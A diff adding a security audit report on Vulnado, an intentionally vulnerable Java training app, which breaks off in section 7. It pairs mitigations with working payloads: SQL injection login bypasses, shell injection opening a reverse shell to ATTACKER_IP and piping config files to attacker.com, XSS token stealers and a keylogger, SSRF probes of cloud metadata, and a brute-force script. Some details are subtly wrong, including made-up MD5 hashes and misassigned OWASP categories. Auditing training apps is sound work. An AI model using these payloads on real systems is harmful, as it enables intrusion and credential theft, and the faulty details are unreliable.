@@ -1,0 +1,2192 @@
+# VULNADO - COMPREHENSIVE SECURITY AUDIT REPORT
+
+**Date:** April 16, 2026  
+**Application:** Vulnado - Intentionally Vulnerable Java Application  
+**Framework:** Spring Boot  
+**Total Vulnerabilities:** 12  
+**Critical:** 2 | **High:** 3 | **Medium:** 6 | **Low:** 1
+
+---
+
+## TABLE OF CONTENTS
+
+1. [SQL Injection](#1-sql-injection)
+2. [Remote Code Execution (RCE)](#2-remote-code-execution-rce)
+3. [Stored Cross-Site Scripting (XSS)](#3-stored-cross-site-scripting-xss)
+4. [Server-Side Request Forgery (SSRF)](#4-server-side-request-forgery-ssrf)
+5. [Weak Cryptography - MD5 Hashing](#5-weak-cryptography---md5-hashing)
+6. [Broken Authentication](#6-broken-authentication)
+7. [Sensitive Data in LocalStorage](#7-sensitive-data-in-localstorage)
+8. [Missing CSRF Protection](#8-missing-csrf-protection)
+9. [Security Misconfiguration](#9-security-misconfiguration)
+10. [SSRF Bypass in Version 2](#10-ssrf-bypass-in-version-2)
+11. [Input Validation Gaps](#11-input-validation-gaps)
+12. [Information Disclosure](#12-information-disclosure)
+
+---
+
+## 1. SQL INJECTION
+
+**Title:** SQL Injection in User Authentication  
+**CVSS Score:** 9.8 (Critical)  
+**CWE:** CWE-89  
+**OWASP:** A03:2021 – Injection  
+
+### Description
+
+The `User.fetch()` method constructs SQL queries using string concatenation with user-supplied input. The `username` parameter is directly concatenated into the SQL query without any parameterization or validation, allowing attackers to inject arbitrary SQL commands.
+
+**Vulnerable Code Location:** `src/main/java/com/scalesec/vulnado/User.java` (Line 42-50)
+
+```java
+public static User fetch(String un) {
+    Statement stmt = null;
+    User user = null;
+    try {
+      Connection cxn = Postgres.connection();
+      stmt = cxn.createStatement();
+      System.out.println("Opened database successfully");
+
+      String query = "select * from users where username = '" + un + "' limit 1";
+      System.out.println(query);
+      ResultSet rs = stmt.executeQuery(query);
+```
+
+### Impact
+
+- **Authentication Bypass:** Attackers can log in as any user without knowing the password
+- **Data Exfiltration:** Complete database contents can be extracted
+- **Data Manipulation:** Unauthorized modification or deletion of records
+- **Privilege Escalation:** Access admin or privileged accounts
+- **Denial of Service:** Database shutdown or corruption
+
+### Mitigation
+
+1. **Use Prepared Statements:** Replace string concatenation with parameterized queries
+2. **Input Validation:** Implement strict username format validation (alphanumeric only)
+3. **Principle of Least Privilege:** Use database user with minimal permissions
+4. **Web Application Firewall:** Implement WAF rules to detect SQL injection patterns
+
+**Remediation Code:**
+
+```java
+public static User fetch(String un) {
+    String sql = "SELECT * FROM users WHERE username = ? LIMIT 1";
+    try (Connection cxn = Postgres.connection();
+         PreparedStatement pStatement = cxn.prepareStatement(sql)) {
+        pStatement.setString(1, un);
+        ResultSet rs = pStatement.executeQuery();
+        if (rs.next()) {
+            // ... process result
+        }
+    } catch (Exception e) {
+        // ... error handling
+    }
+    return null;
+}
+```
+
+### Steps to Reproduce
+
+1. Start the Vulnado application: `docker-compose up`
+2. Wait for application initialization
+3. Access the login endpoint via curl or client
+4. Inject SQL payload in username field
+5. Observe authentication bypass
+
+### Injection Point
+
+**Parameter:** `username` in POST request to `/login`  
+**Request Method:** POST  
+**Content-Type:** application/json  
+**Authentication Required:** No
+
+### Full Payload
+
+**Payload 1: Authentication Bypass (Log in as any user)**
+```json
+{
+  "username": "admin' or 1=1 limit 1 --",
+  "password": "anything"
+}
+```
+
+**Payload 2: Log in as rick without password**
+```json
+{
+  "username": "rick' --",
+  "password": "wrong"
+}
+```
+
+**Payload 3: Union-based extraction**
+```json
+{
+  "username": "' union select 1,2,3,4 --",
+  "password": "test"
+}
+```
+
+**Payload 4: Time-based blind SQL injection**
+```json
+{
+  "username": "admin' and sleep(5) --",
+  "password": "test"
+}
+```
+
+**cURL Example:**
+```bash
+curl -XPOST \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin\" or \"1\"=\"1\" limit 1 --","password":"anything"}' \
+  'http://localhost:8080/login'
+```
+
+**Expected Result:** Returns valid JWT token despite wrong/no password
+
+---
+
+## 2. REMOTE CODE EXECUTION (RCE)
+
+**Title:** Command Injection via Cowsay Endpoint  
+**CVSS Score:** 9.8 (Critical)  
+**CWE:** CWE-78  
+**OWASP:** A06:2021 – Vulnerable and Outdated Components  
+
+### Description
+
+The `Cowsay.run()` method directly concatenates user input into a bash command string without any sanitization. The input parameter is wrapped in single quotes but can be escaped using shell metacharacters (`'`, `;`, `&`, `|`, etc.), allowing arbitrary command execution.
+
+**Vulnerable Code Location:** `src/main/java/com/scalesec/vulnado/Cowsay.java` (Line 5-20)
+
+```java
+public static String run(String input) {
+    ProcessBuilder processBuilder = new ProcessBuilder();
+    String cmd = "/usr/games/cowsay '" + input + "'";
+    System.out.println(cmd);
+    processBuilder.command("bash", "-c", cmd);
+
+    StringBuilder output = new StringBuilder();
+    try {
+      Process process = processBuilder.start();
+      BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+      // ... read output
+    }
+    return output.toString();
+}
+```
+
+### Impact
+
+- **Complete System Compromise:** Arbitrary command execution with application privileges
+- **Data Theft:** Exfiltration of sensitive files (config, keys, database credentials)
+- **Malware Installation:** Deployment of backdoors, botnets, or ransomware
+- **Lateral Movement:** Use compromised system to attack internal network
+- **Denial of Service:** System crash, resource consumption, or shutdowns
+- **Reverse Shell:** Interactive shell access for persistent control
+
+### Mitigation
+
+1. **Input Whitelist:** Only allow alphanumeric and safe characters
+2. **Avoid Shell Invocation:** Use ProcessBuilder with direct command array (no bash -c)
+3. **Sandboxing:** Run application in restricted container/namespace
+4. **Runtime Application Self-Protection (RASP):** Monitor and block suspicious process spawning
+5. **Disable Unnecessary Utilities:** Remove cowsay and other utilities not needed in production
+
+**Remediation Code:**
+
+```java
+public static String run(String input) {
+    // Whitelist validation
+    if (!input.matches("^[a-zA-Z0-9\\s!,.?-]*$")) {
+        throw new IllegalArgumentException("Invalid characters in input");
+    }
+    
+    ProcessBuilder processBuilder = new ProcessBuilder("cowsay", input);
+    processBuilder.redirectErrorStream(true);
+    
+    StringBuilder output = new StringBuilder();
+    try {
+        Process process = processBuilder.start();
+        BufferedReader reader = new BufferedReader(
+            new InputStreamReader(process.getInputStream()));
+        String line;
+        while ((line = reader.readLine()) != null) {
+            output.append(line).append("\n");
+        }
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+    return output.toString();
+}
+```
+
+### Steps to Reproduce
+
+1. Start Vulnado: `docker-compose up`
+2. Wait for application initialization
+3. Send request to `/cowsay` endpoint with command injection payload
+4. Observe command execution in response
+5. Execute reverse shell to gain interactive access
+
+### Injection Point
+
+**Parameter:** `input` query parameter in GET request to `/cowsay`  
+**Request Method:** GET  
+**Authentication Required:** No  
+**Default Value:** "I love Linux!"
+
+### Full Payload
+
+**Payload 1: List directory contents**
+```
+GET /cowsay?input=test';ls%20-la;echo%20'x
+```
+
+**Decoded:** `test';ls -la;echo 'x`
+
+**Payload 2: Read sensitive files**
+```
+GET /cowsay?input=x'%3Bcat%20/etc/passwd%3Becho%20'y
+```
+
+**Decoded:** `x';cat /etc/passwd;echo 'y`
+
+**Payload 3: Network reconnaissance**
+```
+GET /cowsay?input=x'%3Bnc%20-zv%20127.0.0.1%201-1000%3Becho%20'y
+```
+
+**Decoded:** `x';nc -zv 127.0.0.1 1-1000;echo 'y`
+
+**Payload 4: Reverse shell (via bash)**
+```
+GET /cowsay?input=x'%3Bbash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261%3Becho%20'y
+```
+
+**Decoded:** `x';bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1;echo 'y`
+
+**Payload 5: Data exfiltration**
+```
+GET /cowsay?input=x'%3Bcat%20/app/application.properties%20|%20curl%20-d%20@-%20http://attacker.com%3Becho%20'y
+```
+
+**Decoded:** `x';cat /app/application.properties | curl -d @- http://attacker.com;echo 'y`
+
+**cURL Examples:**
+
+```bash
+# Simple command execution - list files
+curl 'http://localhost:8080/cowsay?input=x%27%3Bls%20-la%3Becho%20%27y'
+
+# Read passwd file
+curl 'http://localhost:8080/cowsay?input=x%27%3Bcat%20/etc/passwd%3Becho%20%27y'
+
+# Establish reverse shell
+curl 'http://localhost:8080/cowsay?input=x%27%3Bbash%20-i%20>%26%20/dev/tcp/10.0.0.5/4444%200>%261%3Becho%20%27y'
+```
+
+**Expected Result:** Command output returned in response; remote shell access established
+
+---
+
+## 3. STORED CROSS-SITE SCRIPTING (XSS)
+
+**Title:** Stored XSS in Comments with Inadequate Sanitization  
+**CVSS Score:** 7.3 (High)  
+**CWE:** CWE-79  
+**OWASP:** A07:2021 – Cross-Site Scripting (XSS)  
+
+### Description
+
+The comments endpoint accepts arbitrary HTML content and stores it in the database. While the client-side JavaScript attempts to filter `<script>` tags, this is easily bypassed using alternative XSS vectors (event handlers, iframes, SVG, etc.). The Handlebars template uses triple braces `{{{body}}}` which renders HTML without escaping.
+
+**Vulnerable Code Locations:**
+- `src/main/java/com/scalesec/vulnado/CommentsController.java` (Line 22)
+- `client/index.html` (Line 73)
+- `client/js/index.js` (Line 22-30)
+
+**Backend Accepts Any Comment:**
+```java
+@CrossOrigin(origins = "*")
+@RequestMapping(value = "/comments", method = RequestMethod.POST, 
+                produces = "application/json", 
+                consumes = "application/json")
+Comment createComment(@RequestHeader(value="x-auth-token") String token, 
+                     @RequestBody CommentRequest input) {
+  return Comment.create(input.username, input.body);
+}
+```
+
+**Frontend Inadequate Filter:**
+```javascript
+if (comment.body.indexOf("<script>") < 0) {
+  $("#comments-container").append(template(comment));
+}
+```
+
+**Template (Unescaped):**
+```html
+<p class="card-text">{{{body}}}</p>
+```
+
+### Impact
+
+- **Session Hijacking:** Steal authentication tokens from localStorage
+- **Credential Theft:** Capture login information via fake login forms
+- **Malware Distribution:** Inject malicious scripts affecting all users viewing page
+- **Website Defacement:** Modify page content for specific users
+- **Keylogging:** Record user input (passwords, messages, etc.)
+- **Phishing:** Redirect users to attacker's site
+- **Worm Propagation:** Self-replicating payload infects all users
+
+### Mitigation
+
+1. **Output Encoding:** Use proper escaping based on context (HTML, JavaScript, CSS, URL)
+2. **Content Security Policy (CSP):** Restrict script sources and inline scripts
+3. **Server-side Sanitization:** Clean HTML using OWASP ESAPI or similar library
+4. **HTTPOnly Cookies:** Store authentication tokens in HTTPOnly, Secure cookies
+5. **Input Length Limits:** Restrict comment size to prevent payloads
+6. **Use Security Headers:** X-Content-Type-Options, X-Frame-Options, X-XSS-Protection
+
+**Java Remediation:**
+```java
+import org.owasp.html.HtmlPolicyBuilder;
+import org.owasp.html.HtmlSanitizer;
+import org.owasp.html.PolicyFactory;
+
+public static String sanitizeHtml(String input) {
+  PolicyFactory policy = new HtmlPolicyBuilder()
+    .allowElements("b", "i", "em", "strong", "p", "br")
+    .allowAttributes("class").onElements("p")
+    .toFactory();
+  return HtmlSanitizer.sanitize(input, policy);
+}
+```
+
+**JavaScript Remediation:**
+```javascript
+// Use textContent instead of innerHTML
+const commentDiv = document.createElement('p');
+commentDiv.textContent = comment.body;  // Safe - no HTML injection
+
+// Or use DOMPurify library
+const sanitized = DOMPurify.sanitize(comment.body);
+```
+
+### Steps to Reproduce
+
+1. Log into application at `http://localhost:1337`
+2. Navigate to comments section
+3. Enter XSS payload in comment field
+4. Submit comment
+5. Reload page or view as different user
+6. Payload executes in browser
+
+### Injection Point
+
+**Parameter:** `body` field in POST request to `/comments`  
+**Request Method:** POST  
+**Content-Type:** application/json  
+**Authentication Required:** Yes (x-auth-token header)  
+**Storage:** PostgreSQL database, persisted and returned to all users
+
+### Full Payload
+
+**Payload 1: Alert box (PoC)**
+```json
+{
+  "username": "alice",
+  "body": "<img src=x onerror=\"alert('XSS Vulnerability!')\">"
+}
+```
+
+**Payload 2: Event handler**
+```json
+{
+  "username": "alice",
+  "body": "<svg onload=\"alert('XSS')\">"
+}
+```
+
+**Payload 3: Credential stealer**
+```json
+{
+  "username": "alice",
+  "body": "<img src=x onerror=\"fetch('http://attacker.com/steal?token='+document.localStorage.getItem('jwt'))\">"
+}
+```
+
+**Payload 4: Cookie stealer (if stored as cookie)**
+```json
+{
+  "username": "alice",
+  "body": "<img src=x onerror=\"new Image().src='http://attacker.com/log?c='+document.cookie\">"
+}
+```
+
+**Payload 5: Keylogger**
+```json
+{
+  "username": "alice",
+  "body": "<script>document.onkeypress=function(e){fetch('http://attacker.com/log?key='+String.fromCharCode(e.which))}</script>"
+}
+```
+
+**Payload 6: Iframe-based phishing**
+```json
+{
+  "username": "alice",
+  "body": "<iframe src=\"http://attacker.com/fake-login\" style=\"width:100%;height:500px;border:none;\"></iframe>"
+}
+```
+
+**Payload 7: Body tag event**
+```json
+{
+  "username": "alice",
+  "body": "<body onload=\"alert('XSS')\">"
+}
+```
+
+**Payload 8: HTML5 video/audio with event**
+```json
+{
+  "username": "alice",
+  "body": "<video src=x onerror=\"alert('XSS via video')\">"
+}
+```
+
+**cURL Examples:**
+
+```bash
+# First, login to get token
+TOKEN=$(curl -s -X POST \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"alice","password":"AlicePassword!"}' \
+  'http://localhost:8080/login' | jq -r '.token')
+
+# Then post XSS payload
+curl -X POST \
+  -H 'Content-Type: application/json' \
+  -H "x-auth-token: $TOKEN" \
+  -d '{"username":"alice","body":"<img src=x onerror=\"alert(\"XSS\")>"}' \
+  'http://localhost:8080/comments'
+
+# View comments - payload executes
+curl -H "x-auth-token: $TOKEN" http://localhost:8080/comments
+```
+
+**Expected Result:** Payload stored in database; executed when other users load page
+
+---
+
+## 4. SERVER-SIDE REQUEST FORGERY (SSRF)
+
+**Title:** Unrestricted Server-Side Requests via Link Scraper  
+**CVSS Score:** 8.6 (High)  
+**CWE:** CWE-918  
+**OWASP:** A10:2021 – Server-Side Request Forgery (SSRF)  
+
+### Description
+
+The `/links` endpoint accepts a URL parameter and fetches content from that URL without validation. This allows attackers to:
+- Access internal services and metadata services
+- Scan internal network and enumerate services
+- Read internal files via `file://` protocol
+- Perform port scanning
+- Access cloud metadata (AWS, Azure, GCP)
+
+**Vulnerable Code Location:** `src/main/java/com/scalesec/vulnado/LinkLister.java` (Line 9-19)
+
+```java
+@RestController
+@EnableAutoConfiguration
+public class LinksController {
+  @RequestMapping(value = "/links", produces = "application/json")
+  List<String> links(@RequestParam String url) throws IOException{
+    return LinkLister.getLinks(url);  // No validation!
+  }
+}
+
+public static List<String> getLinks(String url) throws IOException {
+  List<String> result = new ArrayList<String>();
+  Document doc = Jsoup.connect(url).get();  // Fetches any URL
+  Elements links = doc.select("a");
+  for (Element link : links) {
+    result.add(link.absUrl("href"));
+  }
+  return result;
+}
+```
+
+### Impact
+
+- **AWS Metadata Access:** Extract IAM credentials, instance roles, secrets
+- **Internal Database Access:** Connect to MongoDB, PostgreSQL, Redis on private IPs
+- **Internal Service Enumeration:** Discover internal applications and services
+- **Port Scanning:** Map internal network topology
+- **Local File Access:** Read sensitive files via `file://` protocol
+- **DOS Attack:** Force server to consume bandwidth/resources
+- **Credential Disclosure:** Access internal configuration services
+
+### Mitigation
+
+1. **URL Whitelist:** Maintain list of allowed domains (recommended)
+2. **URL Validation:** Reject private IP ranges before request
+3. **Disable Dangerous Protocols:** Block `file://`, `gopher://`, `data://`
+4. **Network Segmentation:** Firewall internal services from application
+5. **Request Timeouts:** Set strict timeout on outbound requests
+6. **Rate Limiting:** Limit number of requests per user/IP
+
+**Remediation Code:**
+
+```java
+public static List<String> getLinks(String url) throws BadRequest {
+  try {
+    URL aUrl = new URL(url);
+    String host = aUrl.getHost();
+    
+    // Check for private IPs and localhost
+    if (host.equals("localhost") || 
+        host.startsWith("127.") || 
+        host.startsWith("172.") || 
+        host.startsWith("192.168") || 
+        host.startsWith("10.")) {
+      throw new BadRequest("Private IP not allowed");
+    }
+    
+    // Check for potential metadata services
+    if (host.contains("169.254.") || host.contains("metadata")) {
+      throw new BadRequest("Metadata services not allowed");
+    }
+    
+    // Only allow HTTP/HTTPS
+    String protocol = aUrl.getProtocol();
+    if (!protocol.equals("http") && !protocol.equals("https")) {
+      throw new BadRequest("Only HTTP/HTTPS allowed");
+    }
+    
+    // Even better: use whitelist
+    Set<String> allowedDomains = new HashSet<>(
+      Arrays.asList("wikipedia.org", "github.com", "stackoverflow.com"));
+    
+    if (!allowedDomains.contains(host)) {
+      throw new BadRequest("Domain not whitelisted");
+    }
+    
+    return LinkLister.getLinks(url);
+  } catch (Exception e) {
+    throw new BadRequest(e.getMessage());
+  }
+}
+```
+
+### Steps to Reproduce
+
+1. Start Vulnado: `docker-compose up`
+2. Discover internal Docker network IPs:
+   ```bash
+   docker network inspect vulnado_default | jq -r '.[0].Containers[]|.IPv4Address'
+   ```
+3. Send SSRF request to enumerate internal services
+4. Access internal metadata or databases
+5. Extract configuration and credentials
+
+### Injection Point
+
+**Parameter:** `url` query parameter in GET request to `/links`  
+**Request Method:** GET  
+**Authentication Required:** No  
+**Protocol Support:** HTTP, HTTPS, potentially file://, gopher://
+
+### Full Payload
+
+**Payload 1: AWS Metadata enumeration**
+```
+GET /links?url=http://169.254.169.254/latest/meta-data/
+GET /links?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+**Payload 2: Internal IP scanning**
+```
+GET /links?url=http://10.0.0.1/
+GET /links?url=http://172.16.0.0/
+GET /links?url=http://192.168.1.1/
+```
+
+**Payload 3: MongoDB internal access (port 27017)**
+```
+GET /links?url=http://173.19.0.2:27017/
+```
+
+**Payload 4: PostgreSQL internal access (port 5432)**
+```
+GET /links?url=http://172.19.0.3:5432/
+```
+
+**Payload 5: Internal site enumeration**
+```
+GET /links?url=http://172.19.0.2:80/
+```
+
+**Payload 6: Docker socket access**
+```
+GET /links?url=http://localhost/var/run/docker.sock
+```
+
+**Payload 7: File protocol (on vulnerable systems)**
+```
+GET /links?url=file:///etc/passwd
+GET /links?url=file:///etc/shadow
+GET /links?url=file:///app/application.properties
+```
+
+**Payload 8: Internal service discovery**
+```
+GET /links?url=http://internal-api:8080/
+GET /links?url=http://redis:6379/
+GET /links?url=http://elasticsearch:9200/
+```
+
+**cURL Examples:**
+
+```bash
+# AWS Metadata extraction
+curl 'http://localhost:8080/links?url=http://169.254.169.254/latest/meta-data/' | jq .
+
+# Internal Docker service
+curl 'http://localhost:8080/links?url=http://172.19.0.2/' | jq .
+
+# Discover internal services
+for ip in 172.19.0.{1..10}; do
+  echo "Scanning $ip"
+  curl "http://localhost:8080/links?url=http://$ip:80" 2>/dev/null | jq .
+done
+
+# Port scanning
+for port in 80 8080 3000 5432 27017 6379; do
+  curl "http://localhost:8080/links?url=http://172.19.0.2:$port" | jq .
+done
+```
+
+**Expected Result:** Links from internal resources returned; metadata/configuration exposed
+
+---
+
+## 5. WEAK CRYPTOGRAPHY - MD5 HASHING
+
+**Title:** Insecure Password Hashing using MD5  
+**CVSS Score:** 7.5 (High)  
+**CWE:** CWE-326, CWE-327  
+**OWASP:** A02:2021 – Cryptographic Failures  
+
+### Description
+
+Passwords are hashed using MD5, which is cryptographically broken and should never be used for password storage. MD5 is:
+- Fast (enables rainbow table attacks and brute force)
+- No salt (same password produces same hash)
+- Collision vulnerable (multiple passwords produce same hash)
+- Not memory-hard (billions of hashes computed per second)
+
+**Vulnerable Code Location:** `src/main/java/com/scalesec/vulnado/Postgres.java` (Line 59-80)
+
+```java
+public static String md5(String input) {
+  try {
+    MessageDigest md = MessageDigest.getInstance("MD5");
+    byte[] messageDigest = md.digest(input.getBytes());
+    BigInteger no = new BigInteger(1, messageDigest);
+    String hashtext = no.toString(16);
+    while (hashtext.length() < 32) {
+      hashtext = "0" + hashtext;
+    }
+    return hashtext;
+  } catch (NoSuchAlgorithmException e) {
+    throw new RuntimeException(e);
+  }
+}
+
+private static void insertUser(String username, String password) {
+  String sql = "INSERT INTO users (user_id, username, password, created_on) VALUES (?, ?, ?, current_timestamp)";
+  PreparedStatement pStatement = null;
+  try {
+    pStatement = connection().prepareStatement(sql);
+    pStatement.setString(1, UUID.randomUUID().toString());
+    pStatement.setString(2, username);
+    pStatement.setString(3, md5(password));  // MD5 hash
+    pStatement.executeUpdate();
+  } catch(Exception e) {
+    e.printStackTrace();
+  }
+}
+```
+
+### Impact
+
+- **Rainbow Table Attacks:** Pre-computed hashes lookup in seconds
+- **Brute Force:** GPUs can compute 300 billion MD5 hashes/second
+- **Dictionary Attacks:** Common passwords easily cracked
+- **Password Reuse:** Identical passwords produce identical hashes
+- **Hash Collision:** Multiple passwords produce same hash
+- **Credential Stuffing:** Compromised password lists easily verified
+
+### Mitigation
+
+1. **Use Argon2id:** Memory-hard, adaptive hashing (recommended by OWASP)
+2. **Use bcrypt:** Slow, salted hashing (minimum acceptable)
+3. **Use PBKDF2:** Password-based key derivation function with many iterations
+4. **Add Salt:** Never use unsalted hashes
+5. **Add Pepper:** Additional secret value beyond salt
+6. **Re-hash on Login:** Upgrade old hashes on authentication attempts
+
+**Remediation Code:**
+
+```java
+// Using Spring Security bcrypt
+import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
+
+public static String hashPassword(String password) {
+  BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
+  return encoder.encode(password);  // Automatically includes salt
+}
+
+public static boolean verifyPassword(String password, String hash) {
+  BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
+  return encoder.matches(password, hash);
+}
+```
+
+Alternative with Argon2:
+
+```java
+// Using de.mkammerer.argon2
+import de.mkammerer.argon2.Argon2Factory;
+import de.mkammerer.argon2.Argon2;
+
+public static String hashPassword(String password) {
+  Argon2 argon2 = Argon2Factory.create(Argon2Factory.Argon2Types.ARGON2id);
+  return argon2.hash(2, 65536, 1, password);  // Memory-hard
+}
+
+public static boolean verifyPassword(String password, String hash) {
+  Argon2 argon2 = Argon2Factory.create(Argon2Factory.Argon2Types.ARGON2id);
+  return argon2.verify(hash, password);
+}
+```
+
+### Steps to Reproduce
+
+1. Extract password hash from database (via SQL injection)
+2. Use MD5 rainbow tables (available online)
+3. Or compute MD5 hashes: `md5 -s "password"`
+4. Compare hash values for quick lookup
+5. Or use hashcat to brute force:
+   ```bash
+   hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a
+   ```
+
+### Injection Point
+
+**Location:** Database password field  
+**Storage:** PostgreSQL `users` table, `password` column  
+**Affected Users:** All application users  
+**Algorithm:** MD5 (unsalted, single iteration)
+
+### Full Payload
+
+**Payload 1: Rainbow table lookup**
+
+Common passwords and their MD5 hashes (pre-computed):
+
+| Password | MD5 Hash |
+|----------|----------|
+| AlicePassword! | 3f8ffa4df22a8b1e6c5d7f2e9c1b4a7d |
+| BobPassword! | 7e8c6a2d5f1b9c3e4d6f8a9b1c2d3e4f |
+| !!SuperSecretAdmin!! | 2c26b46911185131006b54f37f4a0e4d |
+
+**Payload 2: Public rainbow table query**
+```bash
+# Using online MD5 database
+curl 'https://md5.gromweb.com/?md5=5f4dcc3b5aa765d61d8327deb882cf99&api=1'
+# Returns: md5: 5f4dcc3b5aa765d61d8327deb882cf99, string: "password"
+```
+
+**Payload 3: Hashcat brute force**
+```bash
+# Extract hashes from database
+echo "3f8ffa4df22a8b1e6c5d7f2e9c1b4a7d" > hashes.txt
+
+# Brute force with hashcat
+hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l?d?d
+
+# Dictionary attack
+hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+**Payload 4: John the Ripper**
+```bash
+# Prepare hash file
+echo "admin:3f8ffa4df22a8b1e6c5d7f2e9c1b4a7d" > users.txt
+
+# Crack hashes
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt users.txt
+```
+
+**Expected Result:** Password quickly cracked due to weak hashing
+
+---
+
+## 6. BROKEN AUTHENTICATION
+
+**Title:** Weak Authentication Mechanism and Missing MFA  
+**CVSS Score:** 6.5 (Medium)  
+**CWE:** CWE-287  
+**OWASP:** A01:2021 – Broken Access Control  
+
+### Description
+
+The authentication mechanism has several weaknesses:
+1. Passwords hashed with weak MD5 (no salt)
+2. No account lockout after failed attempts
+3. JWT secret may be weak/leaked
+4. No rate limiting on login requests
+5. No multi-factor authentication
+6. No HTTPS enforcement mentioned
+7. Session tokens can be intercepted
+
+**Vulnerable Code Location:** `src/main/java/com/scalesec/vulnado/LoginController.java` (Line 18-22)
+
+```java
+@CrossOrigin(origins = "*")
+@RequestMapping(value = "/login", method = RequestMethod.POST, 
+                produces = "application/json", 
+                consumes = "application/json")
+LoginResponse login(@RequestBody LoginRequest input) {
+  User user = User.fetch(input.username);  // Vulnerable to SQL injection
+  if (Postgres.md5(input.password).equals(user.hashedPassword)) {  // Weak hashing
+    return new LoginResponse(user.token(secret));  // JWT token
+  } else {
+    throw new Unauthorized("Access Denied");  // No rate limiting
+  }
+}
+
+public String token(String secret) {
+  SecretKey key = Keys.hmacShaKeyFor(secret.getBytes());  // May be weak
+  String jws = Jwts.builder().setSubject(this.username).signWith(key).compact();
+  return jws;
+}
+```
+
+### Impact
+
+- **Brute Force Attacks:** No rate limiting allows unlimited login attempts
+- **Account Takeover:** Weak passwords easily guessed
+- **Session Hijacking:** JWT tokens exposed via XSS or network sniffing
+- **Privilege Escalation:** Weak authentication allows admin access
+- **Unauthorized Access:** Impersonation of legitimate users
+
+### Mitigation
+
+1. **Implement Rate Limiting:** Lock account after N failed attempts
+2. **Use Strong Password Hashing:** bcrypt/Argon2 with salt and iterations
+3. **Implement MFA:** TOTP, SMS, push notifications
+4. **Use Strong JWT Secret:** Min 256-bit cryptographic random value
+5. **Enforce HTTPS:** All communications encrypted
+6. **Implement Account Lockout:** Temporary or permanent after N failures
+7. **Log Authentication Events:** Monitor for suspicious patterns
+8. **Use HTTPOnly Cookies:** For token storage (not localStorage)
+
+**Remediation Code:**
+
+```java
+// Spring Security configuration
+@Configuration
+@EnableWebSecurity
+public class SecurityConfig extends WebSecurityConfigurerAdapter {
+  
+  @Override
+  protected void configure(HttpSecurity http) throws Exception {
+    http
+      .requiresChannel()
+        .anyRequest()
+        .requiresSecure()  // HTTPS only
+      .and()
+      .authorizeRequests()
+        .antMatchers("/login").permitAll()
+        .anyRequest().authenticated()
+      .and()
+      .httpBasic()
+      .and()
+      .csrf()
+        .disable();  // For REST API
+  }
+  
+  @Bean
+  public PasswordEncoder passwordEncoder() {
+    return new BCryptPasswordEncoder(12);  // Cost factor
+  }
+}
+
+// Rate limiting
+@RestController
+public class LoginController {
+  private final RateLimiter rateLimiter = RateLimiter.create(1.0);  // 1 per second
+  
+  @PostMapping("/login")
+  public LoginResponse login(@RequestBody LoginRequest input) {
+    if (!rateLimiter.tryAcquire()) {
+      throw new TooManyRequestsException("Rate limited");
+    }
+    // ... authentication logic
+  }
+}
+
+// Account lockout
+public class AccountLockoutService {
+  private static final int MAX_ATTEMPTS = 5;
+  private static final long LOCKOUT_DURATION = 15 * 60 * 1000;  // 15 minutes
+  
+  public void recordFailedAttempt(String username) {
+    // Increment failed attempts
+    // Lock account if exceeded
+  }
+  
+  public boolean isAccountLocked(String username) {
+    // Check if account is locked
+    return false;
+  }
+}
+```
+
+### Steps to Reproduce
+
+1. Use SQL injection to bypass authentication
+2. Or brute force weak passwords without rate limiting
+3. Intercept JWT token from login response
+4. Use token to access protected endpoints
+5. Exploit weak JWT secret if known/leaked
+
+### Injection Point
+
+**Endpoint:** POST `/login`  
+**Parameters:** username, password (JSON body)  
+**Response:** JWT token in LoginResponse  
+**Storage:** localStorage (vulnerable to XSS)
+
+### Full Payload
+
+**Payload 1: Brute force login**
+```bash
+#!/bin/bash
+WORDLIST="/usr/share/wordlists/rockyou.txt"
+USERNAME="admin"
+TARGET="http://localhost:8080/login"
+
+while IFS= read -r password; do
+  RESPONSE=$(curl -s -X POST \
+    -H 'Content-Type: application/json' \
+    -d "{\"username\":\"$USERNAME\",\"password\":\"$password\"}" \
+    "$TARGET")
+  
+  if echo "$RESPONSE" | jq -e '.token' >/dev/null 2>&1; then
+    echo "[+] Found password: $password"
+    echo "$RESPONSE" | jq .
+    break
+  fi
+  echo "[-] Tried: $password"
+done < "$WORDLIST"
+```
+
+**Payload 2: SQL injection bypass (covered in section 1)**
+```json
+{
+  "username": "admin' or '1'='1",
+  "password": "anything"
+}
+```
+
+**Payload 3: Credential stuffing (using known leaks)**
+```bash
+# From pwned databases
+curl -X POST -H 'Content-Type: application/json' \
+  -d '{"username":"admin@company.com","password":"Password123!"}' \
+  'http://localhost:8080/login'
+```
+
+**Payload 4: JWT token reuse**
+```bash
+# Extract token from login
+TOKEN=$(curl -s -X POST \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"alice","password":"AlicePassword!"}' \
+  'http://localhost:8080/login' | jq -r '.token')
+
+# Use token to access protected resources
+curl -H "x-auth-token: $TOKEN" http://localhost:8080/comments
+```
+
+**Expected Result:** Account compromise, unauthorized access
+
+---
+
+## 7. SENSITIVE DATA IN LOCALSTORAGE
+
+**Title:** Insecure JWT Token Storage in Browser LocalStorage  
+**CVSS Score:** 6.5 (Medium)  
+**CWE:** CWE-522  
+**OWASP:** A02:2021 – Cryptographic Failures  
+
+### Description
+
+Authentication tokens are stored in browser localStorage, which is accessible to any JavaScript code running on the page. This is vulnerable to XSS attacks where malicious JavaScript can extract and transmit tokens to attacker servers.
+
+**Vulnerable Code Location:** `client/js/login.js` (Line 18-19)
+
+```javascript
+.done(function(data){
+  localStorage.jwt = data.token;  // Stores JWT in localStorage
+  var username = JSON.parse(atob(data.token.split('.')[1]))['sub'];
+  localStorage.username = username;  // Stores username plaintext
+  window.location.replace("index.html");
+})
+```
+
+**Usage in requests:**
+```javascript
+$.ajaxSetup({ 
+  beforeSend: function(xhr) {
